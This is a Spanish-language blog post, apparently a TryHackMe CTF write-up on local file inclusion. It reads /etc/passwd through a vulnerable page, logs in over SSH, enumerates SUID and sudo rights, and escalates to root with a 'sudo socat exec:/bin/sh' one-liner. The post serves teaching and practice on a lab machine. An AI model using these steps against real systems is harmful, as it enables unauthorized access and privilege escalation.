<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>tryhackme: LFI - Pentester - Ctf’s</title>
<meta name="description" content="Un desafío LFI para principiantes">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Pentester - Ctf's">
<meta property="og:title" content="tryhackme: LFI">
<meta property="og:url" content="http://localhost:4000/LFI/">


  <meta property="og:description" content="Un desafío LFI para principiantes">



  <meta property="og:image" content="http://localhost:4000/assets/images/lfi/logo.png">





  <meta property="article:published_time" content="2021-11-15T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/LFI/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "Deiby Espinosa",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Pentester - Ctf's Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">tryhackme: LFI</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/perfil.png" alt="Deiby Espinosa" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Deiby Espinosa</h3>
    
    
      <p class="author__bio" itemprop="description">
        Ingeniero de sistemas, entusiasta por la seguridad informatica.
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Bogota - Colombia</span>
        </li>
      

      
        
          
        
          
        
          
        
          
        
          
            <li><a href="https://github.com/DeibyPeralta" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="https://instagram.com/deiby.peralta" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
          
        
      

      

      
        <li>
          <a href="mailto:deibysp39@gmail.com">
            <meta itemprop="email" content="deibysp39@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="tryhackme: LFI">
    <meta itemprop="description" content="Un desafío LFI para principiantes">
    <meta itemprop="datePublished" content="November 15, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">tryhackme: LFI
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-15T00:00:00-05:00">November 15, 2021 </time>&emsp;
          
          
        </p>
        <h1 id="local-file-inclusion">Local File Inclusion</h1>

<p>Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con 
este tipo de fallo (a diferencia de Remote File Inclusión <em>RFI</em> que incluye archivos alojados en otros servidores).</p>

<p>Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar 
funciones en PHP para incluir archivos.</p>

<h3 id="una-definicion-un-poco-menos-tecnica">una definicion un poco menos tecnica</h3>

<p>El ataque de inclusión de archivos locales es el que utiliza el que puede incluir cualquier archivo local, es decir, todos los 
archivos que están presentes en el servidor si el permiso es correcto en el archivo.</p>

<h2 id="qué-peligro-representa-esto-si-solo-se-incluyen-ficheros-que-estén-en-el-mismo-servidor">¿Qué peligro representa esto si solo se incluyen ficheros que estén en el mismo servidor?</h2>

<p>Un atacante podría modificar los parámetros de lo que se incluye, por ejemplo, podría indicarle al 
sitio web que se incluyan otros archivos que también están en el servidor, comprometiendo la seguridad del mismo por completo.</p>

<p>El archivo más común en Unix que podemor verificar es <em>/etc/passwd</em>, tal ruta, es el archivo de contraseñas en sistemas linux</p>

<h3 id="vamos-a-la-practica">vamos a la practica</h3>

<p>al visitar la ruta http://10.10.194.21, para este caso es la de nuestra maquina</p>

<p>lo primero que vemos es una pagina de inicio, vemos un poco de teoria sobre <em>LFI</em> y <em>RFI</em></p>

<p><img src="/assets/images/lfi/home.png" alt="pagina de inicio" /></p>

<p>ahora vamos ver un articulo</p>

<p><img src="/assets/images/lfi/url.png" alt="url aritulo" /></p>

<p>vemos la url y probamos, la idea es visualizar el archivo de contraseñas de linux</p>

<p><img src="/assets/images/lfi/passwd.png" alt="passwd lfi" /></p>

<h2 id="encontramos-un-usuario-y-contraseña-nos-conectamos-por-ssh-y-buscamos-las-banderas">Encontramos un usuario y contraseña, nos conectamos por SSH y buscamos las banderas</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh falconfeast@10.10.194.21
falconfeast@10.10.194.21<span class="s1">'s password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 16 00:54:02 IST 2021

  System load:  0.02              Processes:           85
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 68%               IP address for eth0: 10.10.194.21
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Tue Nov 16 00:52:53 2021 from 10.9.4.214
falconfeast@inclusion:~$ 
</span></code></pre></div></div>

<p>encontramos la <em>flag</em> y la leemos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>falconfeast@inclusion:~<span class="nv">$ </span><span class="nb">ls
</span>articles  user.txt
falconfeast@inclusion:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
6x9xxx5x1x8xx7x4x7x9
</code></pre></div></div>
<p>ahora buscamos obtener privilegios <em>root</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>falconfeast@inclusion:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su

falconfeast@inclusion:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>falconfeast on inclusion:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User falconfeast may run the following commands on inclusion:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/socat
</code></pre></div></div>
<ul>
  <li>el comando <em>sudo -l</em> lo que hace es, enumerar los privilegios del usuario o verifica un mando</li>
</ul>

<p>vemos que podemos usar <em>socat</em> para elevar privilegios <img src="https://gtfobins.github.io/gtfobins/socat/" alt="aqui" /> podemos leer un poco
respecto a ello</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>falconfeast@inclusion:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/socat stdin <span class="nb">exec</span>:/bin/sh
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
root@inclusion:~# <span class="nb">whoami
</span>root
</code></pre></div></div>
<p>ejecutamos <em>script /dev/null -c bash</em> y luego <em>CTRL + Z</em> para regresar a la <em>shell</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@inclusion:/root# <span class="nb">cat </span>root.txt
xx96x1x4x4x4x5x5x9xx
</code></pre></div></div>
<p>listo, somos usuario <em>root</em> y tenemos la <em>flag</em></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">LFI</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#local-file-inclusion" class="page__taxonomy-item" rel="tag">Local File Inclusion</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-11-15T00:00:00-05:00">November 15, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/blue/" class="pagination--pager" title="tryhackme: blue
">Previous</a>
    
    
      <a href="/discovery/" class="pagination--pager" title="tryhackme: Content Discovery
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 Deiby Espinosa</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
